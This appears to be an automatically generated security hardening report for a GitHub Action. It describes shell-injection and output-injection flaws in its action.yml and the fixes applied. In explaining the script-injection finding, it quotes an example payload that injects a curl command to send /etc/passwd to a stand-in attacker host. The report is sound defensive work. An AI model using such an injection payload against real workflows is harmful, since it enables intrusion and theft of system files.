<!-- markdownlint-disable -->

# Hardening Report: nanzm--get-time-action/v2.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **nanzm--get-time-action/v2.0** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): The `run:` block in action.yml directly interpolates `${{ inputs.format }}` inside the shell script string on line 28: `TEMPLATE="${{ inputs.format }}"`.

The Actions runner substitutes this expression before the shell executes the script, so an attacker supplying a malicious `format` input (e.g. `"; curl http://evil.com/$(cat /etc/passwd); echo "`) can inject arbitrary shell commands. The value must be passed via an `env:` variable and then referenced as a quoted shell variable (e.g. `"$FORMAT"`) instead.

Locations:

- `action.yml:28`

### github-env-injection (severity: high)

The `run:` block writes `$DATE` to `$GITHUB_OUTPUT` on line 35 (`echo "value=$DATE" >> $GITHUB_OUTPUT`) without sanitizing newlines first. `DATE` is derived from `TEMPLATE`, which is set directly from the untrusted `${{ inputs.format }}` expression. An attacker-controlled newline character in `inputs.format` could inject additional `key=value` pairs into `$GITHUB_OUTPUT`, potentially overwriting other outputs. The fix is to sanitize before writing: `safe=$(printf '%s' "$DATE" | tr -d '\n\r'); echo "value=$safe" >> "$GITHUB_OUTPUT"`.

Locations:

- `action.yml:35`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.format }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:28`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, github-env-injection, static-inline-injection

**Notes:**

Fixed all three findings in action.yml:
1. script-injection & static-inline-injection: Moved `${{ inputs.format }}` from the `run:` block into the `env:` block as `INPUT_FORMAT: ${{ inputs.format }}`, then referenced it as `"$INPUT_FORMAT"` in the shell script. This prevents attacker-controlled input from being interpolated directly into the shell command string before execution.
2. github-env-injection: Added newline sanitization before writing to GITHUB_OUTPUT: `safe=$(printf '%s' "$DATE" | tr -d '\n\r')` and then `echo "value=$safe" >> "$GITHUB_OUTPUT"`. This prevents newline injection attacks that could overwrite other output variables. Also properly quoted `"$GITHUB_OUTPUT"` for robustness.

